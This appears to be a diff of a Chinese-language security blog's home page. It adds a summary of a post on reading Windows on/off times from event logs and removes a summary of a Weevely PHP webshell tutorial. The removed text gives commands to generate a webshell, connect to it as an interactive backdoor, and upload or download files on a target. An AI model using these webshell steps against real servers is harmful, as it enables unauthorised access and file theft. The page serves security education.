@@ -55,6 +55,13 @@
 </header><main class="main">
                 <div class="container"><div class="page home" data-home="posts"><div class="home-profile"><div class="home-subtitle">資訊安全相關內容分享</div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/using-turnedontimesview-to-get-windows-off-on-time/">工具介紹-TurnedOnTimesView-取得windows 開關機資訊</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2022-03-13">2022-03-13</time></span></div><div class="content">除了之前介紹使用powershell來抓取開關機資訊外，也可利用現成的工具來取得此資訊。
+TUrnedOnTimesView透過windows event log來比對開關機資訊。
+EventID 41 (Microsoft-Windows-Kernel-Power): 系統重啟前未完整關機。 可能造成的原因包含系統未回應、系統crash，或是未預期的斷電。 EventID 42 (Microsoft-Windows-Kernel-Power): 系統進入睡眠 EventID 1 (Microsoft-Windows-Power-Troubleshooter): 系統從睡眠中開啟. EventID 1074 (USER32): The process xxx has initiated the xxx of computer xxx on behalf of user xxx for the following reason: xxx EventID 6005 (EventLog): 稽核記錄開始。 EventID 6006 (EventLog): 稽核記錄停止。 參考連結 https://www.nirsoft.net/utils/computer_turned_on_times.html </div><div class="post-footer">
+        <a href="/posts/using-turnedontimesview-to-get-windows-off-on-time/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/audit-log/">Audit Log</a>,&nbsp;<a href="/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">資訊安全</a>,&nbsp;<a href="/tags/log/">LOG</a>,&nbsp;<a href="/tags/windows-server/">windows server</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/slove-cmder-font-overlap-problem/">工具使用-Cmder字體重疊調整</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2022-03-07">2022-03-07</time></span></div><div class="content">在使用cmder時，有時會出現字體重疊的問題，原因是設定中將長字串固定長度造成的，可以在設定調整。
 可以參考下圖，在設定中General-&gt; Fonts中將上圖的Compress long strings to fit space取消勾選(下圖紅框處)，儲存後即可正常顯示。</div><div class="post-footer">
@@ -98,20 +105,6 @@ c:\&gt;osqueryi &#34;select name, action from scheduled_tasks where state in (&#
 https://www.cloudflare.com/learning/bots/what-is-credential-stuffing/</div><div class="post-footer">
         <a href="/posts/what-is-credential-stuffing/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">資訊安全</a>,&nbsp;<a href="/tags/%E5%AF%86%E7%A2%BC%E7%A0%B4%E8%A7%A3/">密碼破解</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/introduction-to-weevely-php-webshell/">工具介紹-Weevely (kali linux web shell產生工具)</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a></span>&nbsp;<span class="post-publish">published on <time datetime="2022-02-07">2022-02-07</time></span></div><div class="content">Weevely是使用python寫成的webshell管理工具，可產生php webshell。
-產生Webshell 使用以下指令產生webshell，要注意密碼用特殊字元有時會造成連線失敗。
-如果要產生圖片檔，以jpg命名結尾就可以了。
-weevely generate 567 hello.php 連線Webshell 上傳後使用以下指令連線後門，然後進入一個互動式的shell
-weevely http://urltowebshell/hello.php 567 如果是使用jpg的檔案，一樣直接連線該檔案就行。
-利用Webshell下載檔案 從遠端下載檔案，rpath是遠端路行 lpath是要存的本地路徑(都要包含檔名)
-file.download rpath lpath [-vector]
-利用Webshell上傳檔案 使用:file_upload2web指令可以檔案上傳到目標主機
-:file_upload2web lpath rpath
-:file\_upload2web /home/kali/Desktop/test.exe test.exe 延伸閱讀 資安監控-rever shell監控方法 工具介紹-Python-Backdoor 網頁攻擊手法-上傳弱點 參考資料 https://www.kali.org/tools/weevely https://securityonline.info/weevely-tutorial-php-webshell/ https://github.com/epinna/weevely3 </div><div class="post-footer">
-        <a href="/posts/introduction-to-weevely-php-webshell/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/kali-linux/">Kali Linux</a>,&nbsp;<a href="/tags/webshell/">webshell</a>,&nbsp;<a href="/tags/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6/">滲透測試</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
